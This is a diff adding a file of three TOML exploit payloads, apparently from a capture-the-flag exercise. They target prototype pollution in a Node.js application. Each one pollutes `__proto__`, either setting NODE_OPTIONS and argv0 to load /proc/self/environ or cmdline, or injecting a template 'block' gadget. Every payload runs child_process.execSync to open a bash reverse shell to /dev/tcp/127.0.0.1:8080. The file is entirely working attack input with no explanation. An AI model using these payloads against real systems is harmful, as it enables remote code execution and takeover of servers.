@@ -1,0 +1,42 @@
+### exp1
+title = "userData"
+
+[user]
+name = "admin"
+password = "admin"
+
+[user.__proto__]
+argv0 = "/proc/self/exe"
+shell = "/proc/self/exe"
+NODE_OPTIONS = "--require /proc/self/environ"
+[user.__proto__.env]
+"EVIL" = "require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)//"
+
+
+### exp2
+
+title = "userData"
+
+[user]
+name = "admin"
+password = "admin"
+
+[user.__proto__]
+argv0 = "require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)//"
+shell = "/proc/self/exe"
+NODE_OPTIONS = "--require /proc/self/cmdline"
+
+
+### exp3
+title = "userData"
+
+[user]
+name = "admin"
+password = "admin"
+
+
+[user.__proto__.block]
+type = "Text",
+line = "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
+
+
